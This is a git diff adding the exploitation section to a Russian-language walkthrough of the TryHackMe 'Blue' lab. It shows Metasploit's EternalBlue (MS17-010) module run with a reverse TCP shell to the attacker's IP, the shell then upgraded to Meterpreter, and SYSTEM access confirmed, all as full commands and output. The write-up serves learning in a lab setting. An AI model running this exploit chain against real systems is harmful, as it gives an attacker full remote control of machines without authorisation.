@@ -28,6 +28,11 @@ PORT      STATE SERVICE            VERSION
 Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
+
+---
+
+## 🕵️ Enumeration
+
 ### SMB
 ```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Blue/scans]
@@ -119,18 +124,222 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 204.09 seconds
 ```
 
----
-
-## 🕵️ Enumeration
-
-
 
 ## 📂 Получение доступа
 
+Нахожу эксплойт в msfconsole
+```bash
+┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Blue/scans]
+└─$ msfconsole                                                 
 
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > setg RHOSTS 10.10.67.181
+msf6 > search ms17-010
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+
+...
+
+msf6 > use 0
+msf6 > set LHOST 10.21.104.16
+msf6 > run
+```
+
+Меняю payload
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
+payload => windows/x64/shell/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         10.10.67.181     yes       The target host(s), see https://docs.metasploit.com/docs/using-metas
+                                             ploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affect
+                                             s Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 tar
+                                             get machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wi
+                                             ndows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
+                                             machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Serv
+                                             er 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.21.104.16     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+```
+
+Получил сессию, перевёл в background
+```bash
+Shell Banner:
+Microsoft Windows [Version 6.1.7601]
+-----
+          
+
+C:\Windows\system32>^Z
+Background session 2? [y/N]  y
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+```
 
 ## ⚙️ Привилегии
 
+Нахожу shell to meterpreter
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > search post shell to meterpreter
+
+Matching Modules
+================
+
+   #   Name                                                        Disclosure Date  Rank       Check  Description
+   -   ----                                                        ---------------  ----       -----  -----------
+   0   exploit/linux/http/glinet_unauth_rce_cve_2023_50445         2023-12-10       excellent  Yes    GL.iNet Unauthenticated Remote Command Execution via the logread module.
+   1     \_ target: Unix Command                                   .                .          .      .
+   2     \_ target: Linux Dropper                                  .                .          .      .
+   3   post/multi/gather/multi_command                             .                normal     No     Multi Gather Run Shell Command Resource File
+   4   post/multi/gather/ubiquiti_unifi_backup                     .                normal     No     Multi Gather Ubiquiti UniFi Controller Backup
+   5   post/multi/recon/local_exploit_suggester                    .                normal     No     Multi Recon Local Exploit Suggester
+   6   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
+   7     \_ target: Automatic                                      .                .          .      .
+   8     \_ target: Unix/OSX/Linux                                 .                .          .      .
+   9     \_ target: Windows - PowerShell (In-Memory)               .                .          .      .
+   10    \_ target: Windows (CMD)                                  .                .          .      .
+   11  exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery
+   12    \_ target: Python                                         .                .          .      .
+   13    \_ target: PHP                                            .                .          .      .
+   14    \_ target: PSH                                            .                .          .      .
+   15    \_ target: Regsvr32                                       .                .          .      .
+   16    \_ target: pubprn                                         .                .          .      .
+   17    \_ target: SyncAppvPublishingServer                       .                .          .      .
+   18    \_ target: PSH (Binary)                                   .                .          .      .
+   19    \_ target: Linux                                          .                .          .      .
+   20    \_ target: Mac OS X                                       .                .          .      .
+   21  post/multi/manage/shell_to_meterpreter                      .                normal     No     Shell to Meterpreter Upgrade                                                                                                    
+   22  post/windows/manage/powershell/exec_powershell              .                normal     No     Windows Manage PowerShell Download and/or Execute
+   23  post/windows/manage/exec_powershell                         .                normal     No     Windows Powershell Execution Post Module
+```
+
+Для работы модуля нужен параметр SESSION
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > use 21
+msf6 post(multi/manage/shell_to_meterpreter) > options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to
+                                       auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on
+```
+
+Устанавливаю и запускаю
+```bash
+msf6 post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                               Connection
+  --  ----  ----               -----------                               ----------
+  2         shell x64/windows  Shell Banner: Microsoft Windows [Version  10.21.104.16:4444 -> 10.10.67.181:49273
+                                6.1.7601] -----                          (10.10.67.181)
+
+msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 2
+SESSION => 2
+msf6 post(multi/manage/shell_to_meterpreter) > options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to
+                                       auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION  2                yes       The session to run this module on
+
+
+View the full module info with the info, or info -d command.
+
+msf6 post(multi/manage/shell_to_meterpreter) > run
+```
+
+Получаю Meterpreter
+```bash
+msf6 post(multi/manage/shell_to_meterpreter) > run
+
+[*] Upgrading session ID: 2
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.21.104.16:4433 
+[*] Post module execution completed
+msf6 post(multi/manage/shell_to_meterpreter) > 
+[*] Sending stage (201798 bytes) to 10.10.67.181
+[*] Meterpreter session 3 opened (10.21.104.16:4433 -> 10.10.67.181:49289) at 2025-07-02 03:57:54 -0400
+[*] Stopping exploit/multi/handler
+
+msf6 post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                            Connection
+  --  ----  ----                     -----------                            ----------
+  2         shell x64/windows        Shell Banner: Microsoft Windows [Vers  10.21.104.16:4444 -> 10.10.67.181:492
+                                     ion 6.1.7601] -----                    73 (10.10.67.181)
+  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC           10.21.104.16:4433 -> 10.10.67.181:492
+                                                                            89 (10.10.67.181)
+
+msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 3
+[*] Starting interaction with 3...
+
+meterpreter > 
+```
+
+Подтверждаю получение root:
+```bash
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > shell
+Process 2284 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+```
 
 
 ## 🏁 Флаги
